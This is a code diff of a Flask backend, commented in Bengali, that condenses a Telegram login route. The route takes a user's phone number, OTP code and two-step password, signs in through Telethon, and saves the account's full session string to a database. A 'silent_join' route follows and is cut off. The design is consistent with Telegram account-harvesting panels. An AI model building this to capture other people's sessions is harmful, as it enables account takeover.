@@ -119,85 +119,51 @@ def send_otp_handler():
     finally:
         loop.close() # কাজ শেষে লুপটি পুরোপুরি বন্ধ করে দেওয়া
 
+################
 
 @app.route('/api/verify_login', methods=['POST'])
 def verify_login_handler():
     data = request.json
-    phone = data.get('phone')
-    code = data.get('code')
-    password = data.get('password')
+    phone, code, password = data.get('phone'), data.get('code'), data.get('password')
     
-    # ১. ডাটাবেজ থেকে ডাটা চেক করা
     temp_data = users_col.find_one({"phone": phone, "auth_pending": True})
     if not temp_data:
-        return jsonify({"success": False, "message": "Session Expired! Please try again."})
+        return jsonify({"success": False, "message": "Session Expired!"})
 
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     
     async def process_login():
-        # auto_reconnect=False দিলে Fatal Error আসার সম্ভাবনা কমে যায়
-        client = TelegramClient(StringSession(temp_data["temp_session"]), API_ID, API_HASH, loop=loop, auto_reconnect=False)
+        # line কমানো এবং receive_updates=False যোগ করা হয়েছে ২-স্টেপ ফিক্স করতে
+        client = TelegramClient(StringSession(temp_data["temp_session"]), API_ID, API_HASH, loop=loop, receive_updates=False)
         await client.connect()
-
-        await asyncio.sleep(1)
+        await asyncio.sleep(1) # সেশন স্ট্যাবল করার জন্য
         
         try:
-            if password:
-                user = await client.sign_in(
-                    phone=phone, 
-                    code=code, 
-                    password=password, 
-                    phone_code_hash=temp_data["phone_code_hash"]
-                )
-            else:
-                user = await client.sign_in(
-                    phone=phone, 
-                    code=code, 
-                    phone_code_hash=temp_data["phone_code_hash"]
-                )
+            # পাসওয়ার্ড থাকুক বা না থাকুক, এক লাইনে হ্যান্ডেল করা হয়েছে
+            user = await client.sign_in(phone=phone, code=code, password=password, phone_code_hash=temp_data["phone_code_hash"])
             
-            final_session = client.session.save()
-            
-            # ডাটাবেজে পার্মানেন্ট ডাটা সেভ
-            users_col.update_one(
-                {"phone": phone}, 
-                {"$set": {
-                    "telegram_id": user.id,
-                    "name": user.first_name, 
-                    "session_str": final_session,
-                    "auth_pending": False # সাকসেস হলে পেন্ডিং বন্ধ
-                }}, 
-                upsert=True
-            )
+            users_col.update_one({"phone": phone}, {"$set": {
+                "telegram_id": user.id, "name": user.first_name, 
+                "session_str": client.session.save(), "auth_pending": False
+            }}, upsert=True)
             return True, user.id
         
-        except SessionPasswordNeededError:
-            return False, "PASSWORD_NEEDED"
-        except Exception as e:
-            return False, str(e)
-        finally:
-            await client.disconnect()
+        except SessionPasswordNeededError: return False, "PASSWORD_NEEDED"
+        except Exception as e: return False, str(e)
+        finally: await client.disconnect()
 
     try:
         success, result = loop.run_until_complete(process_login())
+        if success: return jsonify({"success": True, "uid": result})
         
-        if success:
-            return jsonify({"success": True, "uid": result})
-        else:
-            if result == "PASSWORD_NEEDED":
-                return jsonify({
-                    "success": False, 
-                    "message": "Two-steps verification is enabled and a password is required"
-                })
-            return jsonify({"success": False, "message": result})
-            
-    except Exception as fatal_e:
-        return jsonify({"success": False, "message": f"Server Error: {str(fatal_e)}"})
-    finally:
-        if not loop.is_closed():
-            loop.close()
-                
+        msg = "Two-steps verification is enabled and a password is required" if result == "PASSWORD_NEEDED" else result
+        return jsonify({"success": False, "message": msg})
+    except Exception as e: return jsonify({"success": False, "message": str(e)})
+    finally: loop.close()
+        
+
+############-----------------&&&&&&&&&&&&&&&&&&&&____________--------------
 
 
 @app.route('/api/silent_join', methods=['POST'])
